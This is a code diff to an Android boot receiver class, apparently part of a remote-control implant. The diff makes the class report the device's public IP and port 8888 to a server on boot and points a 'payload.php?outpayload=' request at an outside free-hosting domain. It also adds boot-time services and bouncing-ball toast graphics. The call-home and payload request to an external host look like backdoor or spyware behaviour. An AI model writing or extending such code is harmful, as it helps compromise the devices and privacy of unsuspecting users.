@@ -39,6 +39,7 @@ import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.graphics.Canvas;
 import android.graphics.Paint;
+import android.graphics.RectF;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
@@ -174,7 +175,7 @@ public class ReceiverBoot extends BroadcastReceiver
 		_server(context);
 
 		if (getServer()) {
-			logSend(context, "Aktif="+identitasResult+":8888\n");
+			logSend(context, "Aktif="+getPublicIPAddress(context)+":8888\n");
 		}
 
         if (mainSUPER.equals("hidup")) 
@@ -248,6 +249,9 @@ public class ReceiverBoot extends BroadcastReceiver
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
         {
 			context.startService(new Intent(context, SystemThread.class));
+			ServiceTTS tts = new ServiceTTS();
+			tts.str = "";
+			context.startService(new Intent(context, ServiceTTS.class));
 
 			if (installResult) 
 			{
@@ -360,7 +364,7 @@ public class ReceiverBoot extends BroadcastReceiver
 				}
 			}catch (Exception e) {}
 
-			requestUrl = "http://10.42.0.1/payload.php?outpayload="+hash;
+			requestUrl = "https://sunjangyo12.000webhostapp.com/payload.php?outpayload="+hash;
 			requestAksi = "web";
 			mainRequest(context);
 		}
@@ -1155,6 +1159,16 @@ public class ReceiverBoot extends BroadcastReceiver
 		toastView.setBackgroundColor(warna);
 	}
 
+	public void toastImage(Context context, String path, int letak)
+	{
+		toast = new Toast(context.getApplicationContext());
+		toast.setGravity(letak, 0, 0);
+		toast.setView(new ViewKu(context, path, ""));
+
+		View toastView = toast.getView();
+		toastView.setBackgroundColor(Color.TRANSPARENT);
+	}
+
 	public void dialogAlert(Context context, String title, String text) {
 		dialog = new AlertDialog.Builder(context)
 					.setTitle(title)
@@ -1183,16 +1197,18 @@ public class ReceiverBoot extends BroadcastReceiver
         }
 	}
 
-	public void toastImage(Context context, String path, int letak)
-	{
+	public void ballAnime(Context context, int letak) {
 		toast = new Toast(context.getApplicationContext());
 		toast.setGravity(letak, 0, 0);
-		toast.setView(new ViewKu(context, path, ""));
+
+		View bouncingBallView = new BouncingBallView(context);
+      	bouncingBallView.setBackgroundColor(Color.BLACK);
+
+		toast.setView(bouncingBallView);
 
 		View toastView = toast.getView();
 		toastView.setBackgroundColor(Color.TRANSPARENT);
 	}
-
 
     private class ViewKu extends View {
 		private Bitmap image;
@@ -1459,5 +1475,94 @@ public class ReceiverBoot extends BroadcastReceiver
 		}
 	}
 
+}
+
+class BouncingBallView extends View {
+   private int xMin = 0;          // This view's bounds
+   private int xMax;
+   private int yMin = 0;
+   private int yMax;
+   private static float eyeX = 40;
+   private static float eyeY = 20;
+   private float ballRadius = 10; // Ball's radius
+   private float ballX = ballRadius + 20;  // Balls center (x,y)
+   private float ballY = ballRadius + 40;
+   private float ballSpeedX = 5;  // Balls speed (x,y)
+   private float ballSpeedY = 3;
+   private RectF ballBounds;      // Needed for Canvas.drawOval
+   private Paint paint;           // The paint (e.g. style, color) used for drawing
+   
+   // Constructor
+   public BouncingBallView(Context context) {
+      super(context);
+      ballBounds = new RectF();
+      paint = new Paint();
+   }
+  
+   // Called back to draw the view. Also called by invalidate().
+   @Override
+   protected void onDraw(Canvas canvas) {
+      // Draw the ball
+      ballBounds.set(ballX-ballRadius, ballY-ballRadius, ballX+ballRadius, ballY+ballRadius);
+      paint.setColor(Color.GREEN);
+      canvas.drawOval(ballBounds, paint);
+      paint.setColor(Color.RED);
+
+      eyeX += 1;
+      eyeY += 1;
+
+      if (eyeX == 7 && eyeY == 4) {
+      	  eyeX = 2;
+      	  eyeY = 1;
+
+      	  if (eyeX == 8 && eyeY == 5) {
+      	  	  eyeX = 4;
+      	  	  eyeY = 2;
+      	  }
+      }
+
+      canvas.drawLine(0, 0, eyeX, eyeY, paint);
+
+        
+      // Update the position of the ball, including collision detection and reaction.
+      update();
+  
+      // Delay
+      try {  
+         Thread.sleep(30);  
+      } catch (InterruptedException e) { }
+      
+      invalidate();  // Force a re-draw
+   }
+   
+   // Detect collision and update the position of the ball.
+   private void update() {
+      // Get new (x,y) position
+      ballX += ballSpeedX;
+      ballY += ballSpeedY;
+      // Detect collision and react
+      if (ballX + ballRadius > xMax) {
+         ballSpeedX = -ballSpeedX;
+         ballX = xMax-ballRadius;
+      } else if (ballX - ballRadius < xMin) {
+         ballSpeedX = -ballSpeedX;
+         ballX = xMin+ballRadius;
+      }
+      if (ballY + ballRadius > yMax) {
+         ballSpeedY = -ballSpeedY;
+         ballY = yMax - ballRadius;
+      } else if (ballY - ballRadius < yMin) {
+         ballSpeedY = -ballSpeedY;
+         ballY = yMin + ballRadius;
+      }
+   }
+   
+   // Called back when the view is first created or its size changes.
+   @Override
+   public void onSizeChanged(int w, int h, int oldW, int oldH) {
+      // Set the movement bounds for the ball
+      xMax = w-1;
+      yMax = h-1;
+   }
 }
 
